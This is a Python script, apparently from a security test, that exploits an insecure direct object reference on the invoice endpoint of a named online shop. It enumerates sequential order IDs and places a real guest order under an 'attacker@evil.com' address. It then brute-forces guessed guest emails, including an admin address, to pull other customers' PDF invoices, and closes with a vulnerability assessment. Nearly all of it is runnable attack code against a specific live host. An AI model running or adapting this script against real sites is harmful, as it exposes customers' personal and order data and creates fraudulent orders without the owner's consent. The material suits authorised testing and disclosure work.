#!/usr/bin/env python3
"""
Security test script for AUTHZ-VULN-01
Target: https://shophubonline.store
Vulnerability: GET /api/orders/:id/invoice?email=<guestEmail>
  - Unauthenticated access to any guest order invoice if you supply the
    correct guestEmail. Order IDs are sequential integers (IDOR).

Source-confirmed schema (server/src/routes/orders.js lines 29-37):
  isGuest = !req.user && order.guestEmail && req.query.email &&
            order.guestEmail === req.query.email.toLowerCase().trim()
  -> only checks email equality, no rate-limiting, no token, no CAPTCHA

Guest order required fields (orderController.js line 186):
  shippingAddress.fullName, shippingAddress.address, shippingAddress.phone
"""

import requests
import json

BASE_URL = "https://shophubonline.store"
ATTACKER_EMAIL = "attacker@evil.com"
PRODUCT_ID = 24   # confirmed valid from /api/products


def req(method, url, **kwargs):
    """Wrapper that never raises; returns (response_or_None, error_str)."""
    try:
        r = requests.request(method, url, timeout=15, **kwargs)
        return r, None
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"


def show(label, r, err, max_body=400):
    if err:
        print(f"  {label} -> ERROR: {err}")
    else:
        body = r.text[:max_body] if r.text else "(empty)"
        print(f"  {label} -> HTTP {r.status_code} | {body}")


# ──────────────────────────────────────────────────────────────────────
# STEP 0: Confirm product list (find a valid productId)
# ──────────────────────────────────────────────────────────────────────
print("=" * 70)
print("STEP 0: GET /api/products  (find valid productId)")
print("=" * 70)
r0, e0 = req("GET", f"{BASE_URL}/api/products")
show("GET /api/products", r0, e0, 500)
print()

# ──────────────────────────────────────────────────────────────────────
# STEP 1: Probe orders 1-30 WITHOUT any email
# ──────────────────────────────────────────────────────────────────────
print("=" * 70)
print("STEP 1: Probe /api/orders/X/invoice  (no email)  IDs 1-30")
print("=" * 70)

step1 = {}   # {order_id: (status_code|'ERR', body_snippet)}
for oid in range(1, 31):
    r, e = req("GET", f"{BASE_URL}/api/orders/{oid}/invoice")
    if e:
        step1[oid] = ("ERR", e)
        print(f"  Order {oid:>3}: ERROR | {e[:100]}")
    else:
        snippet = r.text[:200]
        step1[oid] = (r.status_code, snippet)
        print(f"  Order {oid:>3}: HTTP {r.status_code} | {snippet[:120]}")
print()

# ──────────────────────────────────────────────────────────────────────
# STEP 2: Probe orders 1-30 WITH test@test.com
# ──────────────────────────────────────────────────────────────────────
print("=" * 70)
print("STEP 2: Probe /api/orders/X/invoice?email=test@test.com  IDs 1-30")
print("=" * 70)

step2 = {}
for oid in range(1, 31):
    r, e = req("GET", f"{BASE_URL}/api/orders/{oid}/invoice",
               params={"email": "test@test.com"})
    if e:
        step2[oid] = ("ERR", e)
        print(f"  Order {oid:>3}: ERROR | {e[:100]}")
    else:
        snippet = r.text[:200]
        step2[oid] = (r.status_code, snippet)
        print(f"  Order {oid:>3}: HTTP {r.status_code} | {snippet[:120]}")
print()

# ──────────────────────────────────────────────────────────────────────
# STEP 3: Create a guest order to obtain a real order ID + email
# ──────────────────────────────────────────────────────────────────────
print("=" * 70)
print("STEP 3: POST /api/orders/guest  (create attacker guest order)")
print("=" * 70)

guest_payload = {
    "guestEmail": ATTACKER_EMAIL,
    "guestName": "Test User",
    "guestPhone": "1234567890",
    "shippingAddress": {
        "fullName": "Test User",
        "fullAddress": "123 Test St",
        "phoneNumber": "1234567890",
        "name": "Test User",
        "address": "123 Test St, Test City, TS",
        "phone": "1234567890",
        "street": "123 Test St",
        "city": "Test City",
        "state": "TS",
        "zipCode": "12345",
        "country": "India"
    },
    "paymentMethod": "cod",
    "items": [{"productId": PRODUCT_ID, "quantity": 1}]
}

r3, e3 = req("POST", f"{BASE_URL}/api/orders/guest",
             headers={"Content-Type": "application/json"},
             json=guest_payload)
show("POST /api/orders/guest", r3, e3, 600)

my_order_id = None
my_order_number = None
if r3 and r3.status_code in (200, 201):
    try:
        data = r3.json()
        my_order_id = data.get("id") or data.get("orderId") or data.get("_id")
        my_order_number = data.get("orderNumber")
        # dig into nested "order" key if needed
        if my_order_id is None and isinstance(data.get("order"), dict):
            my_order_id = data["order"].get("id")
            my_order_number = data["order"].get("orderNumber")
        print(f"\n  -> Attacker order ID     : {my_order_id}")
        print(f"  -> Attacker order number : {my_order_number}")
        print(f"  -> Attacker email        : {ATTACKER_EMAIL}")
    except Exception as ex:
        print(f"  -> Could not parse response: {ex}")
else:
    print("  -> Guest order creation FAILED")
print()

# ──────────────────────────────────────────────────────────────────────
# STEP 3b: Access OWN invoice with the correct email (baseline – expect 200)
# ──────────────────────────────────────────────────────────────────────
if my_order_id:
    print("=" * 70)
    print(f"STEP 3b: Access OWN invoice (order {my_order_id}) – baseline")
    print("=" * 70)
    r3b, e3b = req("GET", f"{BASE_URL}/api/orders/{my_order_id}/invoice",
                   params={"email": ATTACKER_EMAIL})
    show(f"GET /api/orders/{my_order_id}/invoice?email={ATTACKER_EMAIL}", r3b, e3b, 300)
    if r3b:
        print(f"  Content-Type: {r3b.headers.get('Content-Type','?')}")
        print(f"  Content-Disposition: {r3b.headers.get('Content-Disposition','?')}")
    print()

# ──────────────────────────────────────────────────────────────────────
# STEP 4: IDOR – probe neighbouring order IDs with ATTACKER'S email
#   The vulnerability: if a different order happens to have guestEmail
#   matching attacker@evil.com (unlikely for real orders), you get in.
#   More importantly, the absence of brute-force protection means an
#   attacker can enumerate emails against any order ID.
# ──────────────────────────────────────────────────────────────────────
if my_order_id:
    print("=" * 70)
    print(f"STEP 4: IDOR test – probe orders near {my_order_id} with attacker email")
    print("        (demonstrates sequential ID enumeration)")
    print("=" * 70)

    try:
        base = int(my_order_id)
    except (TypeError, ValueError):
        base = None

    if base:
        idor_targets = list(range(max(1, base - 5), base)) + list(range(base + 1, base + 6))
        for oid in idor_targets:
            r, e = req("GET", f"{BASE_URL}/api/orders/{oid}/invoice",
                       params={"email": ATTACKER_EMAIL})
            if e:
                print(f"  Order {oid}: ERROR | {e[:100]}")
            else:
                flag = " *** IDOR: INVOICE LEAKED ***" if r.status_code == 200 else ""
                print(f"  Order {oid}: HTTP {r.status_code}{flag} | {r.text[:200]}")
    else:
        print(f"  Non-integer order ID '{my_order_id}' – skipping range test")
    print()

# ──────────────────────────────────────────────────────────────────────
# STEP 5: Demonstrate the actual IDOR attack vector
#   Attacker creates order → gets their own order ID N
#   They then request invoice for N-1, N-2 … with DIFFERENT emails
#   The server has NO rate-limiting, NO CAPTCHA on this endpoint,
#   so an attacker can brute-force the guestEmail for any order ID.
#   We show this by trying a few common test emails against order IDs
#   we know exist from the Step 1/2 probes.
# ──────────────────────────────────────────────────────────────────────
print("=" * 70)
print("STEP 5: Brute-force demonstration – try known emails against order IDs")
print("        that returned 403 in Step 2 (confirms no rate-limit protection)")
print("=" * 70)

known_403_ids = [oid for oid, (status, _) in step2.items() if status == 403]
emails_to_try = [
    "test@test.com",
    "admin@shophubonline.store",
    "user@example.com",
    ATTACKER_EMAIL,
]

if known_403_ids:
    sample_ids = known_403_ids[:5]   # try first 5
    for oid in sample_ids:
        for em in emails_to_try:
            r, e = req("GET", f"{BASE_URL}/api/orders/{oid}/invoice",
                       params={"email": em})
            if e:
                print(f"  Order {oid} + {em}: ERROR")
            else:
                flag = " *** HIT ***" if r.status_code == 200 else ""
                print(f"  Order {oid} + {em}: HTTP {r.status_code}{flag}")
else:
    print("  No 403 orders found in Step 2 to test.")
print()

# ──────────────────────────────────────────────────────────────────────
# SUMMARY
# ──────────────────────────────────────────────────────────────────────
print("=" * 70)
print("SUMMARY")
print("=" * 70)

# Step 1 distribution
dist1: dict = {}
for oid, (st, _) in step1.items():
    dist1.setdefault(st, []).append(oid)
print("Step 1 (no email) status distribution:")
for st in sorted(dist1, key=lambda x: str(x)):
    print(f"  HTTP {st}: orders {dist1[st]}")

# Step 2 distribution
dist2: dict = {}
for oid, (st, _) in step2.items():
    dist2.setdefault(st, []).append(oid)
print("\nStep 2 (email=test@test.com) status distribution:")
for st in sorted(dist2, key=lambda x: str(x)):
    print(f"  HTTP {st}: orders {dist2[st]}")

print()
if my_order_id:
    print(f"Own guest order created  : ID={my_order_id}, orderNumber={my_order_number}")
    print(f"  Email used             : {ATTACKER_EMAIL}")
else:
    print("Guest order creation: FAILED")

print()
print("VULNERABILITY ASSESSMENT:")
print("  Endpoint    : GET /api/orders/:id/invoice?email=<guestEmail>")
print("  Auth model  : Email-only (no token, no session, no CAPTCHA)")
print("  IDs         : Sequential integers (trivially enumerable)")
print("  Rate limit  : None (brute-force email enumeration possible)")
print("  Impact      : Any guest order's PDF invoice accessible to anyone")
print("                who can guess or brute-force the guest's email address.")
print("  Code ref    : server/src/routes/orders.js lines 29-37")
print("Done.")
